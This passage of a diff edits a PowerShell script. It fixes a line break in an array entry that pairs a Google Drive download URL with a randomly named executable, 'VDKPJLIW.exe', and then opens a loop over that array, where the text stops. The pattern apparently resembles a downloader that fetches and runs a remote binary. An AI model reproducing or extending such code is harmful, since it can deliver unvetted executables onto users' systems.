@@ -1,7 +1,5 @@
-
 $someData = @(
-     [PSCustomObject]@{a = "https://drive.google.com/uc?export=download&id=1Q59tliTQClvTANA5iuGxbhd4ObEM6Xaz
-"; b = "VDKPJLIW.exe"}
+     [PSCustomObject]@{a = "https://drive.google.com/uc?export=download&id=1Q59tliTQClvTANA5iuGxbhd4ObEM6Xaz"; b = "VDKPJLIW.exe"}
    );
 
    foreach ($i in $someData) {
